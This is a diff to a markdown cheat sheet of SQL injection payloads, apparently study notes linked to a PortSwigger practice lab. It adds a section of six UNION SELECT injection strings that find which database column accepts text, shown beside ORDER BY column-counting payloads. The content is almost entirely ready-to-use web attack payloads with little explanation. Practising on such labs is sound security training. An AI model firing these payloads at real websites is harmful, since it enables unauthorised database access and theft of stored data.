@@ -11,7 +11,6 @@ graph TD;
     A[BSM] --> [B] TABLES --> [C] COLUMNS--> [D]DATA;
 ```
 
-
 # Payloads
 
 ## Generate an error on the server
@@ -286,6 +285,17 @@ etc...
 ' ORDER BY 12-- -
 etc...
 ```
+## Finding columns with a useful data type
+```sql
+' UNION SELECT 'test',NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,'test',NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,'test',NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,'test',NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,'test',NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,'test'--
+```
+
+
 - [Practice this payload here](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
 
 ## Listing the database contents on non-Oracle databases (Method 1)
